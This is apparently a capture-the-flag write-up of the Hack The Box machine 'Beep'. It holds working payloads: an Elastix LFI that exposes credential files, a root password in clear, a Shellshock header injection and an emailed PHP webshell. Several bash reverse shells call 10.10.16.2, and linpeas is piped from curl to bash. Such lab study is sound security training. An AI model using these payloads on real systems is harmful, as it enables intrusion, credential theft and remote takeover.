This produces many services but lets start at port 80
![[Pasted image 20240624221122.png]]

Send a GET Request to port 80
`sudo whatweb http://10.10.10.7`
![[Pasted image 20240624221931.png]]

- Redirection to HTTPS
- CentOS
- Apache 2.2.3
- PHP 5.1.6
- ElastixSession (Could be the application running)

**Launch BURP**

- Turn off Proxy Setting 
- Open in Browser

**DirSearch**
```
dirsearch -u https://10.10.10.7 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20 --random-agent -o beep.dirsearch --format=simple
```

![[Pasted image 20240709130216.png]]
- This search produced no immediate results however we do find out later that `/vtigercrm` is a vulnerable endpoint
***
**SEARCHSPLOIT**

```
searchsploit elastix
```

![[Pasted image 20240709131356.png]]

- We are presented with a few options here but we have yet to discover the version of Elastix
- However, we can can use some reasoning to eliminate the some options
- XXS generally isn't the goal with OSCP or CTF's, gaining access to the machine itself is
- Lets start with reading through the LFI exploit to better understand the environment in hopes of landing a shell

***
**Elastix 2.2.0 - 'graph.php' Local File Inclusion php/webapps/37637.pl**

```
 searchsploit -x 37637
```

- *Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.*
- *Elastix 2.2.0 is vulnerable; other versions may also be affected.*

![[Pasted image 20240709132104.png]]

- This seems to be a very simple one-liner capable of LFI

```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

```

- Navigate to the Browser and input payload

![[Pasted image 20240709132308.png]]

- Appears to disclose credentials but formatting is hard to read so lets use in CLI with `curl`

![[Pasted image 20240709132546.png]]

- Try again and skip verification process with `-k`

```
curl -k 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action'
```
![[Pasted image 20240709133127.png]]

- Log into Elastix

![[Pasted image 20240709133224.png]]

![[Pasted image 20240709133523.png]]

***

**SSH**
- Before we go further, lets create a credential list from the output of the `curl` command and try using those passwords to log into root

```
curl -sk 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' | grep -i pass | cut -d = -f 2 | grep -v ^# | grep -v \( | sort | uniq
```

![[Pasted image 20240709135535.png]]

- The admin password works for `root` as well
`root:jEhdIekWmdjE`

**TTP**
#TTP 
`T1078.003: Intial Access: Valid Accounts, Local Acounts`


**FIND**

![[Pasted image 20240709142727.png]]

![[Pasted image 20240709142752.png]]

- Previous  credentials work as well

- Exploring the web portal leads to an option to execute commands and a shell (`nc -e` switch was unavailable)

**SHELLSHOCK PORT 10000**

Upon reviewing Burp History, we come across a lot of `/cgi` endpoints

If cgi is relatively old, we may be able to exploit using the shellshock vulnerability
https://beaglesecurity.com/blog/vulnerability/shellshock-bash-bug.html

![[Pasted image 20240709162839.png]]
An attacker can send a specially crafted environment variable to a Bash-based application. This environment variable will contain a function definition that will be executed by Bash (Bash is a Command language interpreter). The function definition can contain any arbitrary command, which will be executed with the privileges of the user running the Bash-based application.

Example:

```
env x = '() { :;}; echo vuln' bash -c "echo test"
```


Let's see if NMAP has a script for this:
```
grep -inR shellshock /usr/share/nmap/scripts/*.nse
```
![[Pasted image 20240711195830.png]]

This may be worth pursuing!



Review Usage:
```
grep -i usage -C2 /usr/share/nmap/scripts/http-shellshock.nse
```
![[Pasted image 20240711200944.png]]



Attempted but no luck:
```
nmap -sV -p 10000 --script http-shellshock --script-args uri=https://10.10.10.7:10000/left.cgi,cmd=ls 10.10.10.7
```



We may have a false positive. Review the script details
```
vim /usr/share/nmap/scripts/http-shellshock.nse
```
![[Pasted image 20240711201145.png]]


Let's move to Burp and try manually running
Logout of the console and refresh
Send new GET request to Burp Repeater
![[Pasted image 20240711201513.png]]


Lets inject a sleep command of 10 seconds in the User-Agent Header
![[Pasted image 20240711202137.png]]
![[Pasted image 20240711202159.png]]

Now try 1 second to confirm execution
![[Pasted image 20240711202232.png]]
![[Pasted image 20240711202244.png]]



Try a reverse shell:
Mitre
#TTP 
`T1190 Initail Access: Exploit Public Facing Application`
```
() { :;};bash -c 'bash -i >& /dev/tcp/10.10.16.2/9001 0>&1';
```
![[Pasted image 20240711202534.png]]
![[Pasted image 20240711202550.png]]

***
**SMTP**

Think misconfigurations over exploitation
![[Pasted image 20240711211843.png]]

Lets try to manual connect using `nc`
```
nc [target] [port]
```
![[Pasted image 20240711212143.png]]

Trying to verify a user account leads to a message
![[Pasted image 20240711212253.png]]


So we need valid accounts. 
We can take modify previous LFI exploit and enumerate the `/etc/passwd` file for clues
```
curl -k 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action'
```
![[Pasted image 20240711212702.png]]


But to be more precise, we want all users that allow for a shell - `/bin/bash`
Use `grep` and look for all entries ending `/bin/bash$`
```
curl -ks 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action' | grep '/bin/bash$'
```
![[Pasted image 20240711212900.png]]
![[Pasted image 20240711213354.png]]


So, this is a bit complicated but if we now know that these users are verified with SMTP

The idea is to send an email to them with a malicious payload and have the web application read it back to us in order to execute.

Enter `swaks`
![[Pasted image 20240711213619.png]]


```
sudo swaks --to asterisk@localhost --from admin@vtiger.htb --header "Urgent Open Now:" --body 'Click here immeditaley <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
```
![[Pasted image 20240711214025.png]]

So now we can use the LFI command to view `asterisk` email 
```
 curl -ks 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action'
```
![[Pasted image 20240711214408.png]]


Lets try to execute a command using LFI command
```
 curl -ks 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action?cmd=ls'
```
![[Pasted image 20240711214652.png]]
The php system call did not work...




Try `--data-urlencode`
```
 curl -ks 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action' --data-urlencode 'cmd=ls'
```
![[Pasted image 20240711214921.png]]



The php `cmd` parameter is being passed as a POST Request
We were trying to pass this as a GET request with php - which did not work

Sometimes we need to `url encode` the arguments
Usually cant go wrong encoding
```
sudo curl --help all
```
![[Pasted image 20240711215231.png]]


Now get a reverse shell through this method
```
 curl -ks 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"'

```
![[Pasted image 20240711220249.png]]
*I tried on port 9001 and did not succeed*

**PRIV ESC**

Lets find some GTFO BINS
```
sudo -l
```

**NMAP**
![[Pasted image 20240711220524.png]]
![[Pasted image 20240711220550.png]]
![[Pasted image 20240711220643.png]]

**YUM**
Copy and paste entire payload into shell
![[Pasted image 20240711220827.png]]
![[Pasted image 20240711220857.png]]





**LINPEAS**

Serve Linpeas to the victim and pass to bash interpreter
![[Pasted image 20240711221537.png]]
![[Pasted image 20240711221743.png]]

```
curl http://10.10.16.2/linpeas.sh | bash
```
![[Pasted image 20240711222317.png]]


Outdated Kernel
![[Pasted image 20240711222544.png]]
Avoid Kernel exploits unless desperate - They can be very unstable

We find our shell in process list
![[Pasted image 20240711222733.png]]


**SUDO -L**
![[Pasted image 20240711223204.png]]
Produced no results although when run manually (above), we get permission misconfigurations leading to PRIV ESC!
